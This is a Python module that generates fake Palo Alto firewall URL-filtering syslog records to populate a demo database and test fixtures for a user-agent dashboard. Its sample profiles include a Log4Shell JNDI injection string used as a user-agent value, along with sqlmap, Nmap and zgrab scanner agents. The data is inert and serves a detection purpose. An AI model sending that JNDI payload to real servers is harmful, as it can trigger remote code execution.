"""Synthetic PAN-OS URL Filtering syslog, for trying the dashboard without
a firewall, for the README screenshots, and as a fixture for the tests.

Every value here is fabricated: firewall names/serials are obviously fake
(PA-DEMO-*), public-looking IPs come only from the RFC 5737 documentation
ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24), internal IPs from
10.0.0.0/8, and every URL is on an RFC 2606 reserved domain (example.com /
.net / .org). Records go through the collector's own process_syslog(), so
the demo database is built by exactly the same code path real traffic is.

Usage (from the repo root):
    python -m sentry_ua.demo                 # writes demo_user_agents.db
    python -m sentry_ua.demo --db other.db
    SENTRY_UA_DB_PATH=demo_user_agents.db streamlit run dashboard.py
"""
import argparse
import csv
import importlib
import io
import logging
import random
from datetime import datetime, timedelta, timezone

# Field positions matching config.yaml's log_format defaults, plus the
# fixed indexes the collector/dashboard read directly (URL 31, category 33,
# rule 11, source user 12, application 14).
DEFAULT_LOG_FORMAT = {
    "type_index": 3,
    "subtype_index": 4,
    "src_ip_index": 7,
    "dst_ip_index": 8,
    "src_zone_index": 16,
    "dst_zone_index": 17,
    "action_index": 30,
    "user_agent_index": 46,
    "device_serial_index": 2,
    "device_name_index": 59,
}

DEMO_CONFIG = {
    "zones": {"external_zones": ["Outside-Untrust", "WAN", "Internet"]},
    "log_format": DEFAULT_LOG_FORMAT,
    # No webhook - generating demo data must never send alerts anywhere.
    "alerts": {"gchat_webhook_url": ""},
}

FIELD_COUNT = 70


def build_url_log(
    *,
    user_agent,
    src_ip="10.20.1.15",
    dst_ip="203.0.113.10",
    src_zone="Trust",
    dst_zone="Outside-Untrust",
    action="alert",
    url="www.example.com/index.html",
    category="computer-and-internet-info",
    device_serial="PA-DEMO-0001",
    device_name="fw-demo-01",
    rule_name="allow-web",
    source_user="",
    application="web-browsing",
    log_type="THREAT",
    subtype="url",
    generated="2026/09/24 12:00:00",
    syslog_prefix="<14>Sep 24 12:00:00 fw-demo-01 ",
):
    """One PAN-OS-style URL Filtering syslog line (as bytes), CSV-quoted the
    way PAN-OS does it, with the given values at their real field positions
    and blanks everywhere else."""
    fields = [""] * FIELD_COUNT
    fields[0] = "1"
    fields[1] = generated
    fields[2] = device_serial
    fields[3] = log_type
    fields[4] = subtype
    fields[6] = generated
    fields[7] = src_ip
    fields[8] = dst_ip
    fields[11] = rule_name
    fields[12] = source_user
    fields[14] = application
    fields[15] = "vsys1"
    fields[16] = src_zone
    fields[17] = dst_zone
    fields[30] = action
    fields[31] = url
    fields[32] = "(9999)"
    fields[33] = category
    fields[46] = user_agent
    fields[59] = device_name
    buf = io.StringIO()
    csv.writer(buf, lineterminator="").writerow(fields)
    return (syslog_prefix + buf.getvalue()).encode("utf-8")


FIREWALLS = [
    ("PA-DEMO-0001", "fw-hq-edge"),
    ("PA-DEMO-0002", "fw-branch-east"),
    ("PA-DEMO-0003", "fw-dc-core"),
]

# (user_agent, direction, typical action, url, category, application, weight)
PROFILES = [
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
     "egress", "alert", "www.example.com/news/today", "news", "web-browsing", 900),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
     "egress", "alert", "docs.example.org/guide/start", "computer-and-internet-info", "web-browsing", 420),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
     "egress", "alert", "cdn.example.net/assets/app.js", "content-delivery-networks", "web-browsing", 310),
    ("Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.17928; Pro)",
     "egress", "alert", "outlook.example.com/owa/", "business-and-economy", "ms-office365-base", 260),
    ("Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.71",
     "egress", "alert", "update.example.com/v6/", "computer-and-internet-info", "ms-update", 190),
    ("Slack/4.39.95 (Windows NT 10.0.19045)",
     "egress", "alert", "app.example.com/api/rtm.connect", "business-and-economy", "slack-base", 150),
    ("okhttp/4.12.0",
     "egress", "alert", "api.example.net/v2/sync", "computer-and-internet-info", "ssl", 75),
    ("Dropbox/205.4.6588 (Windows 10)",
     "egress", "block-url", "files.example.org/upload", "online-storage-and-backup", "dropbox-base", 40),
    ("curl/8.4.0",
     "egress", "alert", "raw.example.com/install.sh", "computer-and-internet-info", "web-browsing", 34),
    ("python-requests/2.32.3",
     "egress", "alert", "api.example.com/v1/telemetry", "unknown", "web-browsing", 22),
    ("Go-http-client/1.1",
     "egress", "block-url", "198.51.100.23/payload.bin", "malware", "web-browsing", 9),
    ("Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
     "ingress", "block-url", "portal.example.com/", "unknown", "web-browsing", 18),
    ("sqlmap/1.8.4#stable (https://sqlmap.org)",
     "ingress", "block-url", "portal.example.com/login.php?id=1", "unknown", "web-browsing", 11),
    ("zgrab/0.x",
     "ingress", "alert", "portal.example.com/", "unknown", "web-browsing", 27),
    ("${jndi:ldap://203.0.113.66/a}",
     "ingress", "block-url", "portal.example.com/api", "unknown", "web-browsing", 3),
    ("Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
     "ingress", "alert", "portal.example.com/m/", "business-and-economy", "web-browsing", 130),
    ("Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
     "ingress", "alert", "portal.example.com/m/account", "business-and-economy", "web-browsing", 95),
]

EXTERNAL_IPS = [f"{net}.{host}" for net in ("192.0.2", "198.51.100", "203.0.113") for host in (7, 23, 41, 66, 88, 104, 150, 201)]
INTERNAL_IPS = [f"10.{site}.{vlan}.{host}" for site in (20, 40, 60) for vlan in (1, 12) for host in (15, 37, 101)]
USERS = ["", "corp\\jdoe", "corp\\asmith", "corp\\svc-backup"]


def generate(db_path, seed=7, now=None):
    """Builds (or adds to) a demo database at db_path. Deterministic for a
    given seed. Returns the number of user_agents rows written."""
    # Imported here, not at module level, so build_url_log() stays usable
    # without the collector's dependencies (requests, yaml) being imported.
    import palo_ua_tracker

    rng = random.Random(seed)
    now = now or datetime.now(timezone.utc)
    conn = palo_ua_tracker.init_db(db_path)
    try:
        for ua, direction, action, url, category, app, weight in PROFILES:
            # Common UAs show up on every firewall; the rarer (and noisier)
            # ones only on some, so the per-firewall views actually differ.
            seen_on = FIREWALLS if weight >= 100 else rng.sample(FIREWALLS, rng.randint(1, 2))
            for serial, name in seen_on:
                if direction == "egress":
                    src, dst = rng.choice(INTERNAL_IPS), rng.choice(EXTERNAL_IPS)
                    src_zone, dst_zone = "Trust", "Outside-Untrust"
                else:
                    src, dst = rng.choice(EXTERNAL_IPS), rng.choice(INTERNAL_IPS)
                    src_zone, dst_zone = "Outside-Untrust", "DMZ"
                line = build_url_log(
                    user_agent=ua, src_ip=src, dst_ip=dst, src_zone=src_zone,
                    dst_zone=dst_zone, action=action, url=url, category=category,
                    device_serial=serial, device_name=name, application=app,
                    rule_name="inbound-dmz-web" if direction == "ingress" else "outbound-web",
                    source_user=rng.choice(USERS) if direction == "egress" else "",
                    syslog_prefix=f"<14>Sep 24 12:00:00 {name} ",
                )
                palo_ua_tracker.process_syslog(line, conn, DEMO_CONFIG)

                # Spread hit counts and first/last-seen times out so the
                # charts and time columns look like real accumulated
                # traffic rather than one burst at generation time.
                hits = max(1, int(weight * rng.uniform(0.4, 1.3)))
                first = now - timedelta(days=rng.uniform(2, 30))
                last = now - timedelta(minutes=rng.uniform(1, 600))
                conn.execute(
                    "UPDATE user_agents SET hit_count = ?, first_seen = ?, last_seen = ? "
                    "WHERE user_agent = ? AND direction = ? AND device_serial = ?",
                    (
                        hits,
                        first.strftime("%Y-%m-%d %H:%M:%S"),
                        last.strftime("%Y-%m-%d %H:%M:%S"),
                        ua,
                        direction,
                        serial,
                    ),
                )
        return conn.execute("SELECT COUNT(*) FROM user_agents").fetchone()[0]
    finally:
        conn.close()


def main(argv=None):
    parser = argparse.ArgumentParser(description="Generate a synthetic Sentry UA demo database.")
    parser.add_argument("--db", default="demo_user_agents.db", help="output SQLite path (default: %(default)s)")
    parser.add_argument("--seed", type=int, default=7)
    args = parser.parse_args(argv)
    # The collector logs one INFO line per new UA - useful live, just noise
    # for a one-shot demo build. (Imported first: importing it runs its
    # logging.basicConfig(level=INFO), which would undo this otherwise.)
    importlib.import_module("palo_ua_tracker")
    logging.getLogger().setLevel(logging.WARNING)
    count = generate(args.db, seed=args.seed)
    print(f"Wrote {count} demo rows to {args.db}")
    print(f"View it with:  SENTRY_UA_DB_PATH={args.db} streamlit run dashboard.py")


if __name__ == "__main__":
    main()
